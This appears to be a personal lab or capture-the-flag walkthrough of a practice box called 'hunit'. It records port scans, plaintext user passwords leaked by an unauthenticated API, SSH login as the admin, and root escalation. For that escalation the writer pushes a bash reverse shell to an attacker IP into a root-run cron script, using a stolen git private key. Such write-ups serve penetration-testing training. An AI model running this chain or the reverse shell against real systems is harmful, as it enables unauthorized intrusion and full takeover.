# NMAP
```
nmap -sC -sV -Pn -oA hunit 192.168.155.125
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 16:58 CST
Nmap scan report for 192.168.155.125
Host is up (0.045s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy
|_http-title: My Haikus
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Sat, 04 Mar 2023 22:59:16 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sat, 04 Mar 2023 22:59:16 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Sat, 04 Mar 2023 22:59:16 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=3/4%Time=6403CD22%P=x86_64-pc-linux-gnu%r(Get
SF:Request,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charset
SF:=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r\nDate
SF::\x20Sat,\x2004\x20Mar\x202023\x2022:59:16\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x20UP\n
SF:\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\x20com
SF:mercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(html5up\.
SF:net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</title>\n
SF:\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x2
SF:0content=\"width=device-width,\x20initial-scale=1,\x20user-scalable=no\
SF:"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css\"\x20
SF:/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t\t<!--
SF:\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">\n\t\t
SF:\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"row\">\
SF:n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<header\x20
SF:id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"logo\">M
SF:y\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t</div>
SF:\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\n\n\t\
SF:t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTTPOptio
SF:ns,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Le
SF:ngth:\x200\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2022:59:16\x20GMT\r\n
SF:Connection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x20505\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20465\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2022:5
SF:9:16\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>
SF:HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supp
SF:orted</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,Ar
SF:ial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-c
SF:olor:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x2
SF:0h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black
SF:;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</sty
SF:le></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Ve
SF:rsion\x20Not\x20Supported</h1></body></html>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.76 seconds

PORT      STATE    SERVICE     VERSION
12445/tcp open     netbios-ssn Samba smbd 4.6.2
13022/tcp filtered unknown
18030/tcp open     http        Apache httpd 2.4.46 ((Unix))
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
| http-methods: 
|_  Potentially risky methods: TRACE

```
Need to rescan because I was missing something.
```

sudo nmap -sS -p- 192.168.55.125 --max-os-tries 1 --max-retries 3 --min-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 16:29 CST
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.69% done; ETC: 16:34 (0:03:40 remaining)
Stats: 0:02:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.40% done; ETC: 16:34 (0:02:10 remaining)
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.35% done; ETC: 16:34 (0:02:07 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.02% done; ETC: 16:34 (0:01:30 remaining)
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 80.69% done; ETC: 16:34 (0:00:56 remaining)
Nmap scan report for 192.168.55.125
Host is up (0.044s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  unknown
43022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.99 seconds
```

```sudo nmap -sS -p- 192.168.55.125 --max-os-tries 1 --max-retries 3 --min-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 16:29 CST
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.69% done; ETC: 16:34 (0:03:40 remaining)
Stats: 0:02:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.40% done; ETC: 16:34 (0:02:10 remaining)
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.35% done; ETC: 16:34 (0:02:07 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.02% done; ETC: 16:34 (0:01:30 remaining)
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 80.69% done; ETC: 16:34 (0:00:56 remaining)
Nmap scan report for 192.168.55.125
Host is up (0.044s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  unknown
43022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.99 seconds
```


## Recon

While looking at the source code in one of the haiku pages I found reference to localhost:8080/api
Browsing to it gave me options. one was user
http://192.168.155.125:8080/api/user/
```
0

login

"rjackson"

password

"yYJcgYqszv4aGQ"

firstname

"Richard"

lastname

"Jackson"

description

"Editor"

id

1

1

login

"jsanchez"

password

"d52cQ1BzyNQycg"

firstname

"Jennifer"

lastname

"Sanchez"

description

"Editor"

id

3

2

login

"dademola"

password

"ExplainSlowQuest110"

firstname

"Derik"

lastname

"Ademola"

description

"Admin"

id

6

3

login

"jwinters"

password

"KTuGcSW6Zxwd0Q"

firstname

"Julie"

lastname

"Winters"

description

"Editor"

id

7

4

login

"jvargas"

password

"OuQ96hcgiM5o9w"

firstname

"James"

lastname

"Vargas"

description

"Editor"

id

10
```

Found an admin login and used it on port 43022 as it identified as Openssh in the header using netcat.

dademola:ExplainSlowQuest110

```sh
ssh dademola@192.168.55.125 -p43022
The authenticity of host '[192.168.55.125]:43022 ([192.168.55.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.55.125]:43022' (ED25519) to the list of known hosts.
dademola@192.168.55.125's password: 
[dademola@hunit ~]$ whoami
dademola
[dademola@hunit ~]$ ls 
blog.jar  local.txt  shared
[dademola@hunit ~]$ cat local.txt

```

Ran linpeas and saw this below running as root.
```sh
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Mar  6 03:23 cron.daily
-rw------- 1 root root    9 Mar  6 04:03 cron.monthly
-rw------- 1 root root    9 Mar  6 03:43 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh


SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

1       5       cron.daily              nice run-parts /etc/cron.daily
7       25      cron.weekly             nice run-parts /etc/cron.weekly
@monthly 45     cron.monthly            nice run-parts /etc/cron.monthly

```

This should be able to be cloned using git as the server files are hosted inside as root, however, it is listening.
```sh
[dademola@hunit tmp]$ git clone file:///git-server/
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
[dademola@hunit tmp]$ ls
git-server
hsperfdata_dademola
systemd-private-be5dbef1c87c408ba308351590a70e6d-httpd.service-Hfi2wf
systemd-private-be5dbef1c87c408ba308351590a70e6d-systemd-logind.service-ORECbh
tomcat-docbase.8524189676551200947.8080
tomcat.9015328656973165496.8080
vmware-root_305-2125806728
[dademola@hunit tmp]$ cd git-server/
[dademola@hunit git-server]$ ls
NEW_CHANGE  README  backups.sh
[dademola@hunit git-server]$ cat NEW_CHANGE 
[dademola@hunit git-server]$ ls
NEW_CHANGE  README  backups.sh
[dademola@hunit git-server]$ nano backups.sh 
-bash: nano: command not found
[dademola@hunit git-server]$ cat backups.sh  
#!/bin/bash
#
#
# # Placeholder
#
[dademola@hunit git-server]$ git log
commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing

commit 8c0bc9aa81756b34cccdd3ce4ac65091668be77b
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:54:50 2020 -0300

    testing

commit 574eba09bb7cc54628f574a694a57cbbd02befa0
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:39:14 2020 -0300

    Adding backups

commit 025a327a0ffc9fe24e6dd312e09dcf5066a011b5
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:23:04 2020 -0300

    Init
[dademola@hunit git-server]$

[dademola@hunit git-server]$ cat README 
Simple repo to review and commit changes to the sever scripts.
[dademola@hunit git-server]$ git config --global user.name "test"
[dademola@hunit git-server]$ git config --global user.email "test@test.com"
[dademola@hunit git-server]$ git commit -m "test"
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
[dademola@hunit git-server]$ vim backups.sh  
[dademola@hunit git-server]$ git commit -m "test"
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   backups.sh

no changes added to commit (use "git add" and/or "git commit -a")
[dademola@hunit git-server]$ git add
Nothing specified, nothing added.
hint: Maybe you wanted to say 'git add .'?
hint: Turn this message off by running
hint: "git config advice.addEmptyPathspec false"
[dademola@hunit git-server]$ git add .
[dademola@hunit git-server]$ git commit -m "test"
[master ada5e87] test
 1 file changed, 1 insertion(+), 1 deletion(-)
[dademola@hunit git-server]$ git push -u origin
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 269 bytes | 269.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
error: remote unpack failed: unable to create temporary object directory
To file:///git-server/
 ! [remote rejected] master -> master (unpacker error)
error: failed to push some refs to 'file:///git-server/'
[dademola@hunit git-server]$  
```
Above, attempted to see if we had write permissions on the git server after creating a user in the global config. This did not appear to work at all because we lack permissions.

We had gotten the ssh key from /home/git/.ssh/ and was able to use this however, it was running as a git shell and not anything else. After searching it appears that you can use private keys for using git as that user who has the shell.

https://stackoverflow.com/questions/4565700/how-to-specify-the-private-ssh-key-to-use-when-executing-shell-command-on-git

Ran this on my host machine to get a copy of the the git-server from the host.

```sh
GIT_SSH_COMMAND='ssh -i git_id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.55.125:/git-server/
```

It gave me a working copy to my attacking machine and I was able to add a bash reverse shell as seen here:
```
bash -c 'bash -i >& /dev/tcp/192.168.49.55/43022 0>&1' 
```

```
nano backup.sh
chmod +x backup.sh
git add backups.sh
git commit -m "test"
GIT_SSH_COMMAND='ssh -i /home/kali/git_id_rsa -p 43022' git push origin
```
Ran a netcat listener on port 43022.

I was then able to run as root. For some reason the backups.sh file would not run until I added the executable to it. Not sure why it would not work otherwise.